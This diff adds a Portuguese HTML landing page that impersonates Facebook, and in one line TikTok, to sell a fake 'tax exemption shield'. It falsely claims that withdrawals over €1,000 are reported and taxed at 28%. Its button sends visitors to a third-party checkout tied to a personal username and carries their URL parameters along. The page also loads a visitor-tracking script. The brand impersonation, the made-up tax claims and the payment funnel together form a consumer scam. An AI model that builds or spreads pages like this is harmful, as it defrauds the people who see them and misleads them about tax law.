@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wnj6nzjur9");
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proteção Fiscal Facebook</title>
+    <link rel="stylesheet" href="/css/upsell-premium.css">
+</head>
+
+<body>
+    <div class="premium-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" class="logo" style="height: 30px;">
+        </div>
+
+        <div class="badge">Conformidade Legal</div>
+
+        <h1 class="title">Ativar <span style="color: #059669;">Escudo de Isenção Fiscal</span>?</h1>
+
+        <div class="description">
+            Levantamentos acima de €1.000 são reportados automaticamente às finanças e sujeitos a uma taxa de <strong>28%</strong>.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">IMPOSTO ESTIMADO (28%)</div>
+            <div class="amount-value" style="color: #d9534f; text-decoration: line-through; font-size: 24px; opacity: 0.5;">€392,50</div>
+            <div class="amount-value" style="color: #059669;">€0,00</div>
+        </div>
+
+        <div class="description">
+            O <strong>Escudo Fiscal TikTok</strong> garante que recebe 100% do valor líquido no seu banco como bónus isento.
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button pulse" style="background: #059669; box-shadow: 0 10px 20px rgba(5, 150, 105, 0.2);">
+            <span>ATIVAR ISENÇÃO FISCAL</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4"></path></svg>
+        </button>
+
+        <p class="footer-text">
+            © 2026 Facebook Portugal. Evite retenções na fonte automáticas.
+        </p>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
+        }
+
+        function redirectToPayment() {
+            const params = new URLSearchParams(window.location.search);
+            const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=10');
+
+            params.forEach((value, key) => {
+                checkoutUrl.searchParams.set(key, value);
+            });
+
+            window.location.href = checkoutUrl.toString();
+        }
+    </script>
+</body>
+
+</html>
